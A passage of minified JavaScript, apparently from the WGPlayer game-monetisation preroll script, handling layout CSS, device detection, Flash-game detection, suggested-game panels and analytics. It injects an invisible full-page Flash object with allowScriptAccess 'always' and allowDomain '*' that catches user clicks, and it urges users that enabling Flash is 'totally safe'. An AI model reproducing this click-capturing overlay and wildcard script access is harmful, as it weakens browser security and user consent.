                                if (1.3 >= e || 380 > g) p += "\n                                .wgSplash{padding:min(50px, " + 8 * c / 100 + "px)}\n                                .wgSplashContent .wgCenterContent{grid-template-columns:1fr}\n                                .wgSplashContent .wgCenterContent .wgPrerollCTA span{ \n                                    padding: min(20px, 3vh) min(40px, " + 5 * c / 100 + "px);\n                                    font-size: min(16px," + 5 * c / 100 + 'px); \n                                 }\n                                .wgPrerollWb{display:none}\n                                .wgCenterContent>div:first-child{order:2;align-self:baseline}\n                                .wgSplashContent .wgCenterContent .wgButtons{margin:auto}\n                                .wgPrerollDescription,.wgTitle{text-align:center}\n                                .wgPrerollLogo{display:none}\n                                .wgPrerollLogoBottom{content:"";display:block;width:min(150px,30vw);height:min(50px,' +
                                    12 * c / 100 + "px);background-repeat:no-repeat;background-size:contain;margin:auto;transition:.4s}\n                                .wgPrerollLogoBottom:hover{transform:rotateX(360deg)}\n                                .wgThumb{\n                                    width:min(150px," + 60 * c / 100 + "px);\n                                    height:min(150px," + 60 * c / 100 + "px);\n                                }\n                                .wgTitle {\n                                    font-size: min(36px, " +
                                    12 * g / 100 / e + "px);                                                            \n                                 }\n                                 .wgSplashContent .wgCenterContent>div{padding:" + 2 * g / 100 / e + "px;}\n                                 .wgSplashContent .wgCenterContent .wgButtons{padding:" + 2 * g / 100 / e + "px;}\n                                 .wgOtherGames{grid-template-columns:1fr !important;}\n                            ";
                                300 > g && (320 > c || 600 > d) && (p += "\n                                .wgPrerollDescription{display:none;}\n                                .wgSplashContent .wgCenterContent>div{padding:5px;}\n                                .wgOtherGames{grid-template-columns:1fr;}\n                            ");
                                a.s(p, a.Rd)
                            }
                        }
                    }
                }
            },
            s: function(b, c) {
                if (c) {
                    document.getElementById(c) && document.getElementById(c).parentNode.removeChild(document.getElementById(c));
                    var d = document.createElement("style");
                    d.id = c;
                    d.setAttribute("wg-css", "");
                    document.getElementsByTagName("head")[0].appendChild(d);
                    d.styleSheet ? d.styleSheet.cssText += b : d.appendChild(document.createTextNode(b))
                } else a.styleSheet || (a.styleSheet = document.createElement("style"), document.getElementsByTagName("head")[0].appendChild(a.styleSheet)), a.styleSheet.styleSheet ? a.styleSheet.styleSheet.cssText += b : a.styleSheet.appendChild(document.createTextNode(b))
            },
            Zc: function(b) {
                return b ? b.toString().replace(/^\s*[\r\n]/gm, "").trim().replace("'", "\\'").replace('"', '\\"') : ""
            },
            zl: function(b) {
                return new Promise(function(c) {
                    var d = document.createElement("IMG");
                    d.crossOrigin = "Anonymous";
                    d.addEventListener("load", function() {
                        var e = {
                                r: 0,
                                g: 0,
                                b: 0
                            },
                            g = document.createElement("canvas"),
                            p = g.getContext && g.getContext("2d"),
                            m = -4,
                            r = {
                                r: 0,
                                g: 0,
                                b: 0
                            },
                            x = 0;
                        if (!p) return e;
                        var A = g.height = b.naturalHeight || b.offsetHeight || b.height;
                        g = g.width = b.naturalWidth || b.offsetWidth || b.width;
                        p.drawImage(b, 0, 0);
                        try {
                            var z = p.getImageData(0, 0, g, A)
                        } catch (y) {
                            return e
                        }
                        for (e = z.data.length;
                            (m += 20) < e;) ++x, r.r += z.data[m], r.g += z.data[m + 1], r.b += z.data[m + 2];
                        r.r = ~~(r.r / x);
                        r.g = ~~(r.g / x);
                        r.b = ~~(r.b / x);
                        c(r)
                    });
                    d.src = b;
                    b = d
                })
            },
            eb: function() {
                function b() {
                    var d = window.navigator.userAgent;
                    void 0 !== d && (c = d.toLowerCase());
                    return /(ipad|(tablet(?!.*pc))|(android(?!.*mobile))|(windows(?!.*phone)(.*touch(?!.*tablet\spc)))|kindle|playbook|silk|(puffin(?!.*(IP|AP|WP))))/.test(c) ? "tablet" : /(mobi|ipod|phone|blackberry|opera mini|fennec|minimo|symbian|psp|nintendo ds|archos|skyfire|puffin|blazer|bolt|gobrowser|iris|maemo|semc|teashark|uzard|android)/.test(c) ? "phone" : "desktop"
                }
                var c = navigator.userAgent.toLowerCase();
                return {
                    ib: b(),
                    sl: b,
                    isMobile: "desktop" != b() ? !0 : !1,
                    userAgent: c
                }
            }(),
            isMobile: function() {
                return a.eb.isMobile
            },
            ij: !1,
            jb: !1,
            nl: null,
            Rf: null,
            kb: "<object SWFObject .swf <embed flashplayer get.adobe.com".split(" "),
            Rk: function() {
                if ("undefined" !== typeof a.options.lh) {
                    var b = f.lh.split("|");
                    0 < b.length ? b.forEach(function(c) {
                        a.kb.push(c)
                    }) : a.kb.push(a.options.lh)
                }
            },
            bk: function() {
                if ("undefined" !== typeof a.options.removeFlashTags) {
                    var b = f.removeFlashTags.split("|");
                    0 < b.length && b.forEach(function(c) {
                        a.kb.splice(a.kb.indexOf(c), 1)
                    })
                }
            },
            isFlashGame: !1,
            gh: function() {
                if (!0 === a.options.isFlashGame || !1 === a.options.isFlashGame) return a.isFlashGame = a.options.isFlashGame, a.uh(a.isFlashGame), a.options.isFlashGame;
                for (var b = !1, c = "", d = a.G().getElementsByTagName("*"), e = 0; e < d.length; e++) c += d[e].innerHTML.toString();
                c = c.replace(/\x3c!--[\s\S]*?--\x3e/g, "");
                for (d = 0; d < a.kb.length; d++) 0 < a.kb[d].toString().length && -1 < c.indexOf(a.kb[d]) && -1 < c.indexOf(".swf") && (b = !0);
                for (d = 0; d < a.kb.length; d++) 0 < a.kb[d].toString().length && -1 < (-1 < c.indexOf(a.kb[d]) || c.indexOf(".swf")) && (b = !0);
                a.isFlashGame = b;
                a.uh(b);
                return b
            },
            uh: function(b) {
                !0 === b && !0 !== a.options.fe && (a.Ii(), a.Rj())
            },
            dc: function(b, c) {
                var d = document.createElement("param");
                d.name = b;
                d.value = c;
                return d
            },
            Yi: function() {
                !0 === a.useFlashAllowPopup && (a.useFlashAllowPopup = a.Be() || a.Ae() || a.Fe() ? !0 : !1);
                !0 === a.useFlashAllowPopup && (a.Hd = a.F("a", "FlashSplashAnchor"), a.Hd.href = "https://get.adobe.com/flashplayer", a.Hd.target = "_blank", a.s("." + a.Hd.classList[0] + "{position:absolute; top:0; left:0; width:100%; height:100%;}"));
                for (var b = [], c = 0; 884 > c; c += 512) {
                    for (var d = "Q1dTHg0EAAB4nI1TW08TQRSes5fOXnqnLLiAgCIY0rSLJj7woJC2IInYh5JoYgg73c7Sle1us7u08uaL/8M/YvgLDYn+HZzdrUrVGCeTnDPfuX5nckz0/GN8FwE1SxJCqMHd3t5ez6tMBdSxqEfXdhC6rnzhY4CdIqrFYgsJI9/pZW2XhP0aHVEvCsVWLLLj84MYbPSpdZFL7T0nHLrkSj72Rw5tuM5QcDwnmgaHV2FEB1KHWpeBE13Btkpc1x83/QFxvPy0wIeIBh5xS62pcuQxaROLSn0SJvVU0us1WGSXWBdFpifNvHJYbo8G+f1ms9U8O2mfdU72D1uK65MeDY4821eGJCADyrKFhR+dT7Os96NouFuvk57fpTXLH9T3O0/rTwzjWb176biR4y3M0Nv9Sa8yi3eGjBjdmAWbqWx331MravhexNjSYHXWKaFJrMgZ0dRx6R9Jlu9+xm7CP7aTyOrTQEyMgsW47Ywdr+eP3w0DGviuy5h5tnNeS2eSpnrNRnJai2gYJRN5/L8RmfRR+K14bqbP0h+stL8PI5MOrqyBxmuZRVFEmqzlRLQAkqaL+oK+qN/TdX1JX+byInCSrAhqNpcvFEsaBg5zAgYR8xiLEs4oGLIY5zEUMZQwlDHMYagsAYb7GNYx9wDzDzG/gflHmN8U0a/DAXBTFXhBFhggAorXQWBvQCICkBV+YhwyCEBVuc2XLIrn1NzmxHiz/dWYHCEzU1XbGEypWtiDtsydKiZnqxNbbCsci+N5XlGrE8OUJnbWzlXn7Xx1pV3gmP/qQQE+fbsps41kr7Wbz4mBxQisMXlrYlBkFg2zZJhlw5wzzIphzhumwO5btJKePs/cX8yVULrCd/cT7THgOxkRGXE=".slice(c, c + 512), e = Array(d.length), g = 0; g < d.length; g++) e[g] = d.charCodeAt(g);
                    d = new Uint8Array(e);
                    b.push(d)
                }
                b = "https://st.wgplayer.com/wgFlashCheck.swf?wgFlashCallback=window[preroll.config.loaderObjectName]." + a.Zj.name;
                c = document.createElement("object");
                c.setAttribute("type", "application/x-shockwave-flash");
                c.setAttribute("style", "position:absolute; width:100%; height:100%; top:0; left:0; z-index:1000; opacity:0; cursor:pointer; " + (!0 === a.useFlashAllowPopup ? "pointer-events: none;" : ""));
                c.setAttribute("type", "application/x-shockwave-flash");
                c.setAttribute("name", "wgFlashCheck");
                c.setAttribute("movie", b);
                c.setAttribute("src", b);
                c.setAttribute("data", b);
                c.setAttribute("width", "100%");
                c.setAttribute("height", "100%");
                c.setAttribute("allowdomain", "*");
                c.setAttribute("wmode", "transparent");
                c.appendChild(a.dc("wmode", "transparent"));
                c.appendChild(a.dc("allowDomain", "*"));
                c.appendChild(a.dc("allowscriptaccess", "always"));
                c.appendChild(a.dc("data", b));
                c.appendChild(a.dc("movie", b));
                c.appendChild(a.dc("src", b));
                c.appendChild(a.dc("name", "wgFlashCheck"));
                c.appendChild(a.dc("type", "application/x-shockwave-flash"));
                d = document.createElement("embed");
                d.setAttribute("quality", "high");
                d.setAttribute("wmode", "transparent");
                d.setAttribute("width", "100%");
                d.setAttribute("height", "100%");
                d.setAttribute("align", "middle");
                d.setAttribute("allowScriptAccess", "always");
                d.setAttribute("allowFullScreen", "true");
                d.setAttribute("type", "application/x-shockwave-flash");
                d.setAttribute("src", b);
                d.setAttribute("data", b);
                d.setAttribute("movie", b);
                d.setAttribute("pluginspage", "//www.adobe.com/go/getflashplayer");
                c.appendChild(d);
                c.appendChild(d);
                a.Rf = c
            },
            Cl: function() {
                return "removeAllowFlash"
            },
            pl: function() {
                var b = document.createElement("object");
                b.setAttribute("type", "application/x-shockwave-flash");
                b.setAttribute("style", "position:absolute; width:100%; height:100%; top:0; left:0; z-index:999999999; opacity:0; cursor:pointer; " + (!0 === a.useFlashAllowPopup ? "pointer-events: none;" : ""));
                b.setAttribute("type", "application/x-shockwave-flash");
                b.setAttribute("name", "wgFlashCheck");
                b.setAttribute("data", "//st.wgplayer.com/wgFlashCheck.swf?wgFlashCallback=window['preroll']['config']['loaderObjectName'].removeAllowFlash");
                b.setAttribute("movie", "//st.wgplayer.com/wgFlashCheck.swf?wgFlashCallback=window['preroll']['config']['loaderObjectName'].removeAllowFlash");
                b.setAttribute("src", "//st.wgplayer.com/wgFlashCheck.swf?wgFlashCallback=window['preroll']['config']['loaderObjectName'].removeAllowFlash");
                b.setAttribute("width", "100%");
                b.setAttribute("height", "100%");
                b.setAttribute("allowdomain", "*");
                b.setAttribute("wmode", "transparent");
                var c = document.createElement("param");
                c.name = "allowscriptaccess";
                c.value = "always";
                var d = document.createElement("param");
                d.name = "wmode";
                d.value = "transparent";
                b.appendChild(d);
                var e = document.createElement("param");
                e.name = "allowDomain";
                e.value = "*";
                b.appendChild(e);
                var g = document.createElement("embed");
                g.setAttribute("quality", "high");
                g.setAttribute("wmode", "transparent");
                g.setAttribute("width", "100%");
                g.setAttribute("height", "100%");
                g.setAttribute("align", "middle");
                g.setAttribute("allowScriptAccess", "always");
                g.setAttribute("allowFullScreen", "true");
                g.setAttribute("type", "application/x-shockwave-flash");
                g.setAttribute("src", '//st.wgplayer.com/wgFlashCheck.swf?wgFlashCallback=window["preroll"]["config"]["loaderObjectName"].removeAllowFlash');
                g.setAttribute("pluginspage", "//www.adobe.com/go/getflashplayer");
                b.appendChild(g);
                b.appendChild(c);
                b.appendChild(d);
                b.appendChild(e);
                b.appendChild(g);
                a.Rf = b
            },
            nm: function() {
                console.log("Test Flash!!!")
            },
            hc: null,
            Ii: function() {
                if (!a.Ra() || !0 !== a.isFlashGame) return !1;
                a.hc || (a.hc = a.F("div", "flashNotSupported"), a.hc.classList.add("removed"), a.hc.innerHTML = "\n                                                    <div>\n                                                        <div>\n                                                            <div class='wgTitle'>" + (a.options.otherGames.title ? a.options.otherGames.title : "Flash games are no longer supported") + "</div>\n                                                            <div class='wgPrerollDescription'>" +
                    (a.options.otherGames.message ? a.options.otherGames.message : "Flash games are no longer supported. However, we have other fun games for you to enjoy, check them out!") + "</div>\n                                                        </div>\n                                                        <div class='wgOtherGames'></div>\n                                                    </div>\n                ", a.Ra().querySelectorAll(".wgCenterContent")[0].insertBefore(a.hc, a.Ra().querySelectorAll(".wgCenterContent")[0].firstChild), a.s(".wgflashNotSupported{\n                                position:absolute; \n                                top:0; left:0; \n                                width:100%; \n                                height:100%;\n                                z-index:9999;\n                            }              \n                            \n                           .wgflashNotSupported > div:first-child{\n                                width:100%;\n                                height:100%;\n                                grid-template-rows: max-content !important;\n                                display:grid;\n                                grid-template-rows: auto 100%;\n                           }\n              \n                            .wgflashNotSupported .wgTitle,\n                            .wgflashNotSupported .wgPrerollDescription{\n                                text-align:left;\n                                margin-bottom:var(--min202);\n                            }\n                            .wgflashNotSupported+div,\n                            .wgflashNotSupported+div+div{\n                                display:none;\n                            }\n                            .wgflashNotSupported > div{\n                                padding: var(--min202);\n                            }\n                            \n                            .wgflashNotSupported .wgOtherGames{\n                                display:grid;\n                                grid-template-columns:1fr 1fr;\n                                grid-auto-rows: 1fr;\n                                grid-gap:30px;\n                            }\n                            \n                            .wgflashNotSupported .wgOtherGames > div{\n                                border-radius:20px;\n                                box-shadow: 0px 0px 0px 0px #ffffff, 5px 5px 15px rgba(0,0,0,0.2);\n                                transition:.3s;\n                                cursor:pointer;\n                                text-align:left;\n                                display:grid;\n                                overflow:hidden;\n                                grid-template-columns:1fr 2fr;\n                                position:relative;\n                                justify-content: center;\n                                align-items: center;\n                                grid-gap:10px;\n                                background-color:#fff;\n                                padding-right:60px;\n                                height:minmax(0, 1fr);\n                            }\n                            \n                            .wgflashNotSupported .wgOtherGames > div > a{\n                                position:absolute;\n                                top:0;\n                                left:0;\n                                width:100%;\n                                height:100%;\n                                z-index:100;\n                            }\n                            \n                            \n                            .wgflashNotSupported .wgOtherGames > div:hover{\n                               transform:scale(1.05);\n                               transform-origin:center;\n                            }\n                            \n                            .wgflashNotSupported .wgOtherGames > div div:nth-child(1){\n                                content:'1';\n                                display:block;\n                                width:100%;\n                                height:100%;\n                                background-position:center center;\n                                background-repeat:no-repeat;\n                                background-size:cover;\n                            }\n                            .wgflashNotSupported .wgOtherGames > div div:nth-child(3){\n                                content: '2';\n                                position: absolute;\n                                \n                                top: 0;\n                                bottom: 0;\n                                \n                                width: 30px;\n                                height: 30px;\n                                margin: auto;\n                                \n                                right: 15px;\n                                background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAA4AAAAPCAYAAADUFP50AAABKklEQVQokY2TvyvEcRjHX75dDFIGFhmuFFaLC7NFERkNBvInuCubhdtsBsUimVx28iPJarHSme4kAyU/6qVPPur6du7uqc+zPJ/3834/7+fzQR1Un9RzNavSykmAXaAMVIB7YAvopVmoFXU9skypD+qbuqZm/mMPqaxupAp59V2tqrNqkgYmUVBbSlgR6Ab2gBJwBeRqLyQNJvkA8kBPnP8GOAGyzYB/8QzMARNAF3AGTLcC7I+s11HuKXDQCBi6bwMXcd5O4BCYAVbrAYNRi8Aj0AesAMvAKzAcZIaGmTrAfWASWIim7ESp89Hh34h73KzZ0ai6pJbUF7WgdqT3GBjbga/YZwQoAGPAETAEVOs6oN6ql2pR/VaP1YFmDz2kcfVTvVNzLf0O5QcZKy4YNKUs+wAAAABJRU5ErkJggg==);\n                                background-repeat:no-repeat;\n                                background-position:center;\n                                padding:20px;\n                                background-color:#000;\n                                border-radius:50%;              \n                            }\n                        "))
            },
            sk: function() {
                setTimeout(function() {
                    a.Fa(!0, !0, !0)
                }, 200);
                a.hc.classList.remove("removed")
            },
            Ll: function() {
                a.hc.classList.add("removed")
            },
            Rj: function() {
                fetch(a.options.otherGames.file).then(function(b) {
                    return b.json()
                }).then(function(b) {
                    a.Bi(b)
                }).catch(function() {
                    a.Ga() && console.warn("Can't load suggested games")
                })
            },
            Bi: function(b) {
                var c = a.hc.querySelectorAll(".wgOtherGames")[0],
                    d = 4,
                    e;
                for (e in b) b.hasOwnProperty(e) && 0 < d && (c.innerHTML += "\n                        <div>\n                            <div style=\"background-image:url('" +
                    b[e].thumbnail + '\')"></div>\n                            <div style="font-weight:400; font-size: 16px; color:#000;">' + b[e].name + '</div>\n                            <div></div>\n                            <a target="' + b[e].target + '" href="' + b[e].url + '"></a>\n                        </div>                    \n                    ', d--)
            },
            oa: {
                $l: null,
                container: null,
                close: null,
                show: function() {
                    a.oa.container.classList.remove("removed")
                },
                aa: function() {
                    a.oa.container.classList.add("removed")
                }
            },
            fa: null,
            Zk: function() {
                if (!a.Ra() || !0 !== a.isFlashGame) return !1;
                if (!a.fa && (a.fa = a.F("div", "FlashSplash"), a.fa.classList.add("removed"), a.fa.innerHTML += '<div class="wgCenter"> <div class="wgAllowFlash"><div class="wgPreTable"> <div class="wgCenterTable"><div class="wgThumbnail small"></div><div class="wgGameName">' + a.ub(a.options.gameName, a.options.titleExtract) + '</div></div> <div class="wgTable"> <div>1.</div><div> <div class="wgPlayGame">' + a.options.flashButtonText + '</div></div></div></div><div class="wgPreTable"> <div class="wgTable"> <div>2.</div><div>' +
                        (a.options.flashAllowText ? '<div style="margin:0 0 20px 0; font-size:22px;">' + a.options.flashAllowText + "</div>" : "") + '<img src="' + a.Zc(a.options.flashIcon) + '"></div></div></div></div></div>', a.Yi(), a.Ra().insertBefore(a.fa, a.Ra().firstChild), a.fa.insertBefore(a.Rf, a.fa.firstChild), !0 === a.useFlashAllowPopup)) {
                    a.fa.insertBefore(a.Hd, a.fa.firstChild);
                    a.Hd.addEventListener("click", function(e) {
                        a.oa.show();
                        e.preventDefault();
                        e.stopPropagation();
                        e.stopImmediatePropagation();
                        return !1
                    });
                    var b = null,
                        c = 0;
                    a.Ae() ? (b = "//st.wgplayer.com/_media/wg-allow-flash.mp4", c = 66) : a.Be() ? (b = "//st.wgplayer.com/_media/wg-allow-flash-ff.mp4", c = 253) : a.Fe() && (b = "//st.wgplayer.com/_media/wg-allow-flash-op.mp4", c = 102);
                    a.oa.container = a.F("div", "AllowFlashSplashWizard removed");
                    a.oa.container.classList.add("removed");
                    "he" !== navigator.language.toLowerCase() && "ar" !== navigator.language.toLowerCase() || a.oa.container.classList.add("wgRtl");
                    var d = "." + a.oa.container.classList[0] + "{position:fixed !important; top:0; left:0; width:100%; height:100%; z-index: " +
                        parseInt(u + 1E15, 10) + "; max-width:100%; max-height:100%; background-color:rgba(0,0,0,.5)}";
                    d = d + ".wgWizardFrame *{font-family:open sans; font-weight:400; color:#4e4e4e; }.wgWizardFrame{width:500px; background:#fff; padding:20px; margin-left:20px; margin-top:80px; position:relative;}.wgWizardFrame.removed{position:fixed !important; pointer-events:none; user-select:none; position:fixed; overflow:hidden; z-index:-1000; opacity:0; transform:translateX(-10000px) !important; }.wgFontH1{font-size:20px; font-weight:600;display:block; padding:0px 30px 20px 0px;}.wgFontH2{font-size:20px; font-weight:300;display:block; padding:0px 0px 20px 0px;}.wgFontNormal{font-size:16px; font-weight:300;display:block; padding:0px 0px 20px 0px;}.wgFontSmallest{font-size:14px; font-weight:400;display:block; padding:0px 0px 20px 0px;}.wgUpArrow{position:absolute; top:-75px; left:" +
                        (c + "px; width:80px; height:80px; pointer-events:none; background-position:center center; background-repeat:no-repeat; background-image: url(\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' x='0px' y='0px' viewBox='0 0 490 490' style='enable-background:new 0 0 490 490;' xml:space='preserve'%3E%3Cg%3E%3Cpath fill='%2391c845' d='M437.2,178.7c12.8,12.8,12.8,33.4,0,46.2c-6.4,6.4-14.7,9.6-23.1,9.6s-16.7-3.2-23.1-9.6L277.7,111.5v345.8 c0,18-14.6,32.7-32.7,32.7s-32.7-14.6-32.7-32.7V111.5L99,224.9c-12.8,12.8-33.4,12.8-46.2,0s-12.8-33.4,0-46.2L221.9,9.6 C228,3.4,236.3,0,245,0c8.7,0,17,3.4,23.1,9.6L437.2,178.7z'/%3E%3C/g%3E%3C/svg%3E\");}.wgRtl .wgWizardFrame{position:absolute; right:20px;}.wgRtl .wgUpArrow{ right:50px; left:auto; top:-80px; }");
                    a.s(d);
                    d = '<div class="wgWizardFrame"><div class="wgUpArrow"></div><div class="wgFontH1">Click the Lock Icon in the Address Bar and Switch to Allow to Play ##GAME_NAME##</div><div class="wgFontH2">To play some of the games on ##SITE_NAME##, you\'ll need to enable flash - don\'t worry, it\'s totally safe!<br> What you need to do is only allow it by a single click.</div><div class="wgFontNormal"><video autoplay="" loop="" muted="" controls="" width="100%"> <source src="##FLASH_ALLOW_MOVIE##" type="video/mp4"> </video></div>' +
                        (a.Ae() ? '<div class="wgFontNormal"> If you don\'t see the lock option above, you can still enable Flash by following these steps:</div><div class="wgFontNormal"> 1) Open a tab and go to </div><div class="wgFontNormal"><input style="width:100%;padding:5px;font-size:12px" onclick="select()" value="chrome://settings/content/siteDetails?site=https%3A%2F%2F##CLIENT_DOMAIN##"></div><div class="wgFontNormal"> 2)  In the <strong>Flash</strong> section Change the <strong>Block (default)</strong> to <strong>Allow</strong>. </div><div class="wgFontNormal"> 3) Reload the page to make the settings live. </div>' : "") + '<div class="wgFontSmallest">If the steps above not working, plase contact us using the contact form and we\'ll assist you as soon as possible!</div></div>';
                    d = d.replace("##GAME_NAME##", a.ub(a.options.gameName, a.options.titleExtract)).replace("##CLIENT_DOMAIN##", a.yc()).replace("##CLIENT_DOMAIN##", a.yc());
                    d = d.replace("##CLIENT_CONTACT_PAGE##", "undefined" !== typeof a.options.flashAllowContactPage ? a.options.flashAllowContactPage : "//" + a.yc());
                    d = d.replace("##FLASH_ALLOW_MOVIE##", "undefined" !== typeof a.options.flashAllowMovie ? a.options.flashAllowMovie : b);
                    d = d.replace("##SITE_NAME##", "undefined" !== typeof a.options.siteName ? a.options.siteName : a.yc());
                    a.oa.container.innerHTML = d;
                    a.oa.close = a.F("a", "CloseAllowFlashSplashWizard");
                    d = "." + a.oa.close.classList[0] + "{position:absolute; top:5px; right:5px; width:30px; height:30px; cursor:pointer; padding:0; margin:0; overflow:hidden; border-radius:3px; background:#fcfCfc;}";
                    d += "." + a.oa.close.classList[0] + ':before{ content:"\u2716"; position:absolute; top:0; left:0; display:block; width:100%; height:100%; padding:3px 0px 0px 0px; text-align:center; color:#aaa;}';
                    a.s(d);
                    for (a.oa.close.addEventListener("click", function(e) {
                            e.preventDefault();
                            a.oa.aa()
                        }); 0 < document.querySelectorAll("." + a.oa.container.classList[0]).length;) document.querySelector("." + a.oa.container.classList[0]).parentNode.removeChild(document.querySelector("." + a.oa.container.classList[0]));
                    b = document.getElementsByTagName("body")[0];
                    b.insertBefore(a.oa.container, b.childNodes[0]);
                    a.oa.container.getElementsByClassName("wgWizardFrame")[0].appendChild(a.oa.close);
                    window.addEventListener("popstate", function() {
                        a.oa.aa()
                    })
                }
            },
            qk: null,
            im: function() {
                if (!a.Ra()) return !1;
                if (!a.fa) return a.destroy(), !1;
                !0 === a.isFlashGame ? a.Mc(!0, !0) : a.Mc(!0);
                a.jb || (a.fa.classList.contains("wgFlashEnabled") ? a.j(101) : (a.fa.setAttribute("style", "z-index:-1000000"), setTimeout(function() {
                    a.jb || a.fa.removeAttribute("style")
                }, 250), a.fa.classList.remove("removed"), a.fa.classList.add("wgVisible"), a.Mc(!0), setTimeout(function() {
                    a.Fa(!0);
                    a.tb.aa();
                    "undefined" === typeof navigator.mimeTypes["application/x-shockwave-flash"] && a.tk()
                }, 1500)))
            },
            xj: function() {
                if (null !== a.fa) a.fa.classList.add("removed");
                else {
                    a.fa = document.getElementsByClassName("wgFlashSplash")[0];
                    try {
                        a.fa.classList.add("removed")
                    } catch (b) {
                        a.j(102, b)
                    }
                }
            },
            Cc: null,
            $k: function() {
                if (!a.Ra() || !0 !== a.isFlashGame) return !1;
                a.Cc || (a.Cc = a.F("div", "InstallFlashSplash"), a.Cc.classList.add("removed"), a.Cc.innerHTML += '<div class="wgInstallFlash"><div>Please install Adobe Flash Player to play this game: <a href="https://get.adobe.com/flashplayer/" target="_blank">get.adobe.com/flashplayer</a></div></div>', a.fa.insertBefore(a.Cc, a.fa.firstChild))
            },
            tk: function() {
                if (a.Ae() && !a.Fe() && !a.Be() && !a.Lj()) return !1;
                a.Cc.classList.remove("removed")
            },
            Kl: function() {
                return a.jb
            },
            Zj: function() {
                a.j(103);
                a.xj();
                setTimeout(function() {
                    a.Fa();
                    a.tb.aa()
                }, 1);
                if (null !== a.fa) a.fa.classList.add("wgFlashEnabled");
                else {
                    a.fa = document.getElementsByClassName("wgFlashSplash")[0];
                    try {
                        a.fa.classList.add("wgFlashEnabled")
                    } catch (b) {
                        a.j(104, b)
                    }
                }
                clearTimeout(a.qk);
                try {
                    window.preroll.config.loaderObjectName.jb = !0
                } catch (b) {
                    a.j(105)
                }
                a.jb = !0;
                a.ij = !0;
                a.j(106, a.jb);
                setTimeout(function() {
                    a.Fa(!0, !0, !0)
                }, 200)
            },
            Og: {
                ck: !0 === f.ck ? !0 : !1,
                be: "undefined" !== typeof f.be ? f.be : null
            },
            pushEvent: function(b) {
                var c;
                "undefined" != typeof ga ? c = ga : "undefined" != typeof __GAtracker ? c = __GAtracker : c = function() {};
                var d = {
                    hitType: "event",
                    eventCategory: b.a || null,
                    eventAction: b.b || null,
                    vl: b.c,
                    rm: "beacon"
                };
                "function" === typeof b.d && (d.hitCallback = b.d);
                try {
                    c("send", d), "undefined" != typeof a.Og.be && (c("create", a.Og.be, {
                        name: "wgplayer"
                    }), c("wgplayer.send", {
                        hitType: "event",
                        eventCategory: b.a || null,
                        eventAction: b.b || null,
                        eventLabel: b.c,
                        transport: "beacon"
                    }))
                } catch (e) {
                    console.log(e)
                }
            },
            log: function() {},
            j: function(b, c, d, e, g, p, m, r, x, A, z) {
                c = void 0 === c ? null : c;
                d = void 0 === d ? null : d;
                e = void 0 === e ? null : e;
                g = void 0 === g ? null : g;
                p = void 0 === p ? null : p;
                m = void 0 === m ? null : m;
                r = void 0 === r ? null : r;
                x = void 0 === x ? null : x;
                A = void 0 === A ? null : A;
                z = void 0 === z ? null : z;
                if (!0 === a.kd || a.Ga()) {
                    if ("undefined" === typeof b) return !1;
                    var y = b && b.$h ? b.$h : b;
                    if (arguments && (1 < arguments.length || window.wgDebugDefs && "object" === typeof window.wgDebugDefs[arguments[0]])) {
                        var w = [].concat(w$(arguments)).slice(1) || [].concat(w$(arguments)).slice(0);
                        "number" === typeof y && w && window.wgDebugDefs && window.wgDebugDefs[y] && ("object" === typeof window.wgDebugDefs[y] ? console.log.apply(console, ["%c" + (a.Ca() ? "IFRAME: " : "") + window.wgDebugDefs[y].$h, "background: " + window.wgDebugDefs[y].style[0] + "; color: " + window.wgDebugDefs[y].style[1]].concat(w$(w))) : console.log.apply(console, [">> " + window.wgDebugDefs[y]].concat(w$(w))))
                    } else window.wgDebugDefs && "number" === typeof y ? console.log("> " + window.wgDebugDefs[y]) : console.log("> " + y)
                }
            },
            rj: function(b, c) {
                return (b - c) / 1E3 / 60
            },
            jl: function() {
                a.xa = f.contentContainer || f.contentContainerQuery;
                a.Se() ? (a.j(107), a.Gh()) : (a.j(108), setTimeout(function() {
                    a.bc()
                }, 100))
            },
            bc: function() {
                a.xa = f.contentContainer || f.contentContainerQuery;
                a.Se() ? (a.j(109), a.Gh()) : (a.j(110), setTimeout(function() {
                    a.bc()
                }, 1E3))
            },
            ie: !1,
            Ab: !1,
            Xj: function() {
                !0 === a.Ab && a.j(111);
                a.pf || !0 === a.Ab || (a.Bb = !1, a.Xd("Preroll"), a.bd(!1))
            },
            Fj: function() {
                a.Sg++
            },
            Sj: function() {
                return {
                    items: [{
                        name: "<span>Game Monetization by WGPlayer.com</span>",
                        link: null
                    }, {
                        name: "WGPlayer AFG. Version " + a.getVersion(),
                        link: null
                    }],
                    isVisible: !1,
                    Qd: null,
                    uk: function() {
                        a.contextMenu.Qd.classList.remove("wgHidden")
                    },
                    Dh: function() {
                        a.contextMenu.Qd.classList.add("wgHidden")
                    },
                    show: function() {
                        a.$a.classList.remove("wgHidden");
                        a.isVisible = !0
                    },
                    aa: function() {
                        a.$a.classList.add("wgHidden");
                        a.contextMenu.isVisible = !1
                    },
                    toggle: function() {
                        a.contextMenu.isVisible ? a.contextMenu.aa() : a.contextMenu.show()
                    },
                    display: function(b) {
                        a.contextMenu.toggle();
                        b = a.contextMenu.lk({
                            x: b.x,
                            y: b.y
                        }, a.$a);
                        a.$a.style.top = b.y + "px";
                        a.$a.style.left = b.x + "px"
                    },
                    Gj: function() {
                        a.$a = a.F("div", "ContextMenu");
                        a.$a.classList.add("wgHidden");
                        for (var b = 0; b < a.contextMenu.items.length; b++) a.contextMenu.zi(a.contextMenu.items[b]);
                        a.tc(a.$a.querySelector("li span"), "mousedown touchstart", function() {
                            window.open("https://www.wgplayer.com/?utm_source=wgafg&utm_medium=" + (window.location.host || "Unknown") + "&utm_campaign=logo")
                        });
                        a.u().addEventListener("contextmenu", function(c) {
                            c.preventDefault();
                            a.contextMenu.display({
                                x: c.pageX,
                                y: c.pageY
                            })
                        });
                        a.tc(document, "mousedown touchstart", function(c) {
                            if (-1 < (c.path || c.composed && c.composedPath() || []).indexOf(a.$a)) return !1;
                            a.contextMenu.aa()
                        })
                    },
                    lk: function(b, c) {
                        var d = {};
                        var e = c.getBoundingClientRect().width;
                        c = c.getBoundingClientRect().height;
                        var g = !1;
                        if (b.x > a.u().getBoundingClientRect().right || b.y > a.u().getBoundingClientRect().bottom) b.x = a.u().getBoundingClientRect().right - 10, b.y = a.u().getBoundingClientRect().bottom - 60, g = !0;
